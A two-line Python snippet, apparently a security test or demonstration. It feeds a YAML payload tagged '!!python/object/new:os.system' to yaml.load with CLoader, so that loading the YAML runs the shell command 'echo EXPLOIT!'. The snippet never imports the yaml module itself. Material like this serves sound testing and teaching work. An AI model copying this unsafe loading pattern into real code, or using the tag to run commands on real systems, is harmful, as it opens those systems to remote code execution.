from yaml import CLoader
yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", CLoader)
